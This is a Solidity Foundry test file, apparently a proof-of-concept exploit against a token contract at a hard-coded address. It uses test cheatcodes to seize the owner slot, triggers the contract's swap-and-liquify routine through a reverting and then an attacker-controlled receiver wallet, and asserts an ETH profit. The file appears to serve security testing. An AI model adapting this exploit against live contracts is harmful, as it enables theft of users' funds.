// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface JizzJet {
    function owner() external view returns (address);
    function _setReceiverWallet(address payable adminWalletAddress) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function numTokensSellToAddToLiquidity() external view returns (uint256);
}

contract RevertingAdmin {
    receive() external payable {
        revert("Reverting on purpose");
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF2A7429641d1b49a13dCB7E23b67a1a5101231F2;
    address attacker = address(this);
    RevertingAdmin public revertingAdmin;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Become owner
        bytes32 ownerSlot = bytes32(uint256(0));
        vm.store(TARGET, ownerSlot, bytes32(uint256(uint160(attacker))));

        // Deploy reverting admin contract
        revertingAdmin = new RevertingAdmin();

        // Set admin to reverting contract
        JizzJet target = JizzJet(TARGET);
        target._setReceiverWallet(payable(address(revertingAdmin)));

        // Give attacker some tokens
        deal(TARGET, attacker, 1000000 * 10**18);

        // Give attacker ETH for gas
        deal(attacker, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        JizzJet target = JizzJet(TARGET);

        // Record initial ETH balance
        uint256 initialBalance = attacker.balance;

        // Accumulate fee tokens in contract
        address dummy = address(0x123);
        deal(TARGET, dummy, 100000 * 10**18);

        // Make transfers to generate fees
        uint256 contractTokenBalance = target.balanceOf(TARGET);
        uint256 threshold = target.numTokensSellToAddToLiquidity();

        while (contractTokenBalance < threshold) {
            target.transfer(dummy, target.balanceOf(attacker) / 10);
            contractTokenBalance = target.balanceOf(TARGET);
        }

        // Trigger swapAndLiquify (transfer from non-pair address)
        vm.startPrank(dummy);
        target.transfer(attacker, target.balanceOf(dummy) / 2);
        vm.stopPrank();

        // Change admin to attacker EOA
        target._setReceiverWallet(payable(attacker));

        // Accumulate more fees
        contractTokenBalance = target.balanceOf(TARGET);
        while (contractTokenBalance < threshold) {
            target.transfer(dummy, target.balanceOf(attacker) / 10);
            contractTokenBalance = target.balanceOf(TARGET);
        }

        // Trigger swapAndLiquify again to extract stuck ETH
        vm.startPrank(dummy);
        target.transfer(attacker, target.balanceOf(dummy) / 2);
        vm.stopPrank();

        // Verify profit
        assertGt(attacker.balance, initialBalance, "Attacker should have gained ETH");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
